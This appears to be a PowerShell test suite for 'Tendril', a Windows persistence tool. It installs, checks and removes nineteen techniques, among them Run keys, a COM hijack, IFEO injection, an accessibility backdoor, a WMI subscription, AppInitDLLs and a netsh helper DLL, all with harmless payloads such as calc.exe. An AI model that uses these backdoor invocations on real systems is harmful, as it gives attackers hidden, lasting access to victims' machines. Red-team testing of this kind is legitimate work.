$T = "C:\Users\athena\Desktop\Tendril.exe"
$BAT = "C:\Users\athena\Desktop\test_payload.bat"
$pass = 0; $fail = 0; $total = 0

function Test-Module {
    param($Name, $InstallArgs, $CheckPattern, $RemoveArgs)
    $script:total++
    
    # Install
    $out = & $T @InstallArgs 2>&1 | Out-String
    if ($out -notmatch '\[\+\]') {
        Write-Host "  [FAIL] $Name - install: $out"
        $script:fail++; return
    }
    
    # Check
    $out = & $T @CheckPattern 2>&1 | Out-String
    $checkKey = $CheckPattern[-1]
    if ($out -notmatch [regex]::Escape($checkKey)) {
        # Some checks return [!] or [*] which is still valid
        if ($out -notmatch '\[[\*!\+]\]') {
            Write-Host "  [FAIL] $Name - check did not match '$checkKey'"
            $script:fail++; return
        }
    }
    
    # Remove
    $out = & $T @RemoveArgs 2>&1 | Out-String
    if ($out -notmatch '\[\+\]') {
        Write-Host "  [FAIL] $Name - remove: $out"
        $script:fail++; return
    }
    
    Write-Host "  [PASS] $Name"
    $script:pass++
}

function Test-ReconModule {
    param($Name, $Module)
    $script:total++
    $out = & $T check $Module 2>&1 | Out-String
    if ($LASTEXITCODE -ne 0 -and $out -match 'Unhandled exception') {
        Write-Host "  [FAIL] $Name - exception"
        $script:fail++
    } else {
        Write-Host "  [PASS] $Name (recon)"
        $script:pass++
    }
}

Write-Host "============================================"
Write-Host " TENDRIL TEST SUITE - $env:COMPUTERNAME"
Write-Host " $(Get-Date)"
Write-Host "============================================"
Write-Host ""

# 1. RegistryRunKey
Write-Host "[TEST 01] RegistryRunKey"
Test-Module "RegistryRunKey" `
    @("install","RegistryRunKey","/payload:$BAT","/name:TendrilTest") `
    @("check","RegistryRunKey","TendrilTest") `
    @("remove","RegistryRunKey","/name:TendrilTest")

# 2. RegistryRunKey (fileless)
Write-Host "[TEST 02] RegistryRunKey (fileless)"
Test-Module "RegistryRunKey-Fileless" `
    @("install","RegistryRunKey","/payload:Write-Host TENDRIL","/name:TendrilFL","/fileless:true") `
    @("check","RegistryRunKey","TendrilFL") `
    @("remove","RegistryRunKey","/name:TendrilFL")

# 3. ComHijack
Write-Host "[TEST 03] ComHijack"
Test-Module "ComHijack" `
    @("install","ComHijack","/payload:C:\Windows\System32\shell32.dll","/clsid:{BCDE0395-E52F-467C-8E3D-C4579291692E}") `
    @("check","ComHijack","BCDE0395") `
    @("remove","ComHijack","/clsid:{BCDE0395-E52F-467C-8E3D-C4579291692E}")

# 4. ScreensaverBackdoor
Write-Host "[TEST 04] ScreensaverBackdoor"
Test-Module "ScreensaverBackdoor" `
    @("install","ScreensaverBackdoor","/payload:C:\Windows\System32\scrnsave.scr","/timeout:999") `
    @("check","ScreensaverBackdoor","scrnsave") `
    @("remove","ScreensaverBackdoor")

# 5. StartupFolder
Write-Host "[TEST 05] StartupFolder"
Test-Module "StartupFolder" `
    @("install","StartupFolder","/payload:$BAT","/name:TendrilStartup") `
    @("check","StartupFolder","TendrilStartup") `
    @("remove","StartupFolder","/name:TendrilStartup")

# 6. UserInitMprLogon
Write-Host "[TEST 06] UserInitMprLogon"
Test-Module "UserInitMprLogon" `
    @("install","UserInitMprLogon","/payload:$BAT","/variant:environment") `
    @("check","UserInitMprLogon","UserInitMprLogonScript") `
    @("remove","UserInitMprLogon","/variant:environment")

# 7. WinlogonHelper (HKCU Shell)
Write-Host "[TEST 07] WinlogonHelper (HKCU)"
Test-Module "WinlogonHelper" `
    @("install","WinlogonHelper","/payload:$BAT","/target:shell","/hive:HKCU") `
    @("check","WinlogonHelper","HKCU") `
    @("remove","WinlogonHelper","/target:shell","/hive:HKCU")

# 8. PowerShellProfile
Write-Host "[TEST 08] PowerShellProfile"
Test-Module "PowerShellProfile" `
    @("install","PowerShellProfile","/payload:Write-Host TENDRIL_TEST","/scope:currentuser") `
    @("check","PowerShellProfile","Profile") `
    @("remove","PowerShellProfile","/scope:currentuser")

# 9. IFEOInjection (debugger)
Write-Host "[TEST 09] IFEOInjection (debugger)"
Test-Module "IFEOInjection-debugger" `
    @("install","IFEOInjection","/target:notepad.exe","/payload:C:\Windows\System32\calc.exe","/mode:debugger") `
    @("check","IFEOInjection","notepad") `
    @("remove","IFEOInjection","/target:notepad.exe","/mode:debugger")

# 10. IFEOInjection (silent)
Write-Host "[TEST 10] IFEOInjection (silent)"
Test-Module "IFEOInjection-silent" `
    @("install","IFEOInjection","/target:mspaint.exe","/payload:C:\Windows\System32\calc.exe","/mode:silent") `
    @("check","IFEOInjection","mspaint") `
    @("remove","IFEOInjection","/target:mspaint.exe","/mode:silent")

# 11. GhostTask
Write-Host "[TEST 11] GhostTask"
Test-Module "GhostTask" `
    @("install","GhostTask","/payload:C:\Windows\System32\calc.exe","/name:TendrilGhost","/trigger:logon") `
    @("check","GhostTask","TendrilGhost") `
    @("remove","GhostTask","/name:TendrilGhost")

# 12. WmiSubscription
Write-Host "[TEST 12] WmiSubscription"
Test-Module "WmiSubscription" `
    @("install","WmiSubscription","/payload:cmd.exe /c echo TENDRIL","/name:TendrilWmi") `
    @("check","WmiSubscription","TendrilWmi") `
    @("remove","WmiSubscription","/name:TendrilWmi")

# 13. AppInitDlls
Write-Host "[TEST 13] AppInitDlls"
Test-Module "AppInitDlls" `
    @("install","AppInitDlls","/payload:C:\Windows\System32\version.dll") `
    @("check","AppInitDlls","version.dll") `
    @("remove","AppInitDlls","/payload:C:\Windows\System32\version.dll")

# 14. AccessibilityBackdoor
Write-Host "[TEST 14] AccessibilityBackdoor"
Test-Module "AccessibilityBackdoor" `
    @("install","AccessibilityBackdoor","/target:osk","/payload:C:\Windows\System32\calc.exe","/mode:ifeo") `
    @("check","AccessibilityBackdoor","osk") `
    @("remove","AccessibilityBackdoor","/target:osk","/mode:ifeo")

# 15. NetshHelperDll
Write-Host "[TEST 15] NetshHelperDll"
Test-Module "NetshHelperDll" `
    @("install","NetshHelperDll","/payload:C:\Windows\System32\version.dll","/name:tendriltest") `
    @("check","NetshHelperDll","tendriltest") `
    @("remove","NetshHelperDll","/name:tendriltest")

# 16-19. Recon-only modules
Write-Host "[TEST 16] DllSideloadEnum"
Test-ReconModule "DllSideloadEnum" "DllSideloadEnum"

Write-Host "[TEST 17] PathDllPlant"
Test-ReconModule "PathDllPlant" "PathDllPlant"

Write-Host "[TEST 18] ServiceBinaryHijack"
Test-ReconModule "ServiceBinaryHijack" "ServiceBinaryHijack"

Write-Host "[TEST 19] ScheduledTaskHijack"
Test-ReconModule "ScheduledTaskHijack" "ScheduledTaskHijack"

Write-Host ""
Write-Host "============================================"
Write-Host " RESULTS: $pass/$total PASSED, $fail FAILED"
Write-Host "============================================"
